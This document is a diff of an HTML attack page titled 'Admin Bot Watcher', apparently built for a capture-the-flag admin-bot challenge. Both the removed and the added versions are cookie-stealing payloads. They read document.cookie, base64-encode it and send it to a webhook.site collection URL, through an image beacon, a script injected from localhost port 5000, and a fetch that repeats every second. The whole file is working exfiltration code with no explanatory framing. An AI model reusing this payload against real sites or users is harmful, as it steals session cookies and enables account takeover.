@@ -1,36 +1,23 @@
-<!--- <!DOCTYPE html>
-<html>
-<head><title>🕵️ Admin Bot Watcher</title></head>
-<body>
-  <h1>🕵️ Admin Bot Watching...</h1>
-
-  <script>
-    const cookie = encodeURIComponent(document.cookie || "NoCookie");
-    const img = new Image();
-    img.src = `https://webhook.site/09a6b80e-9156-4405-bade-5b37f5ecd762?c=${cookie}`;
-  </script>
-</body>
-</html> --->
-
 <!DOCTYPE html>
 <html>
 <head><title>🕵️ Admin Bot Watcher</title></head>
 <body>
 <h1>🕵️ Admin Bot Watching...</h1>
 
+<!-- Load localhost to trigger cookie -->
+<iframe src="http://127.0.0.1:5000/" style="display:none;"></iframe>
+
+<!-- Try to inject script from localhost -->
 <script>
-// Try to access localhost endpoint with credentials
+const s = document.createElement('script');
+s.src = 'http://127.0.0.1:5000/static/exfil?' + btoa(document.cookie || 'NoCookie');
+document.body.appendChild(s);
+</script>
+
+<!-- Fallback beaconing -->
+<script>
 setInterval(() => {
-  // This sends cookies to / (which is on the same domain as the cookie)
-  fetch("http://127.0.0.1:5000/", {
-    method: "GET",
-    credentials: "same-origin"
-  }).then(r => r.text())
-    .then(t => {
-      // We can't read response due to CORS, but we can beacon out
-      const img = new Image();
-      img.src = "https://webhook.site/09a6b80e-9156-4405-bade-5b37f5ecd762?c=" + btoa(document.cookie);
-    });
+  fetch(' https://webhook.site/your-uuid-here?c=' + btoa(document.cookie || 'NoCookie'));
 }, 1000);
 </script>
 </body>
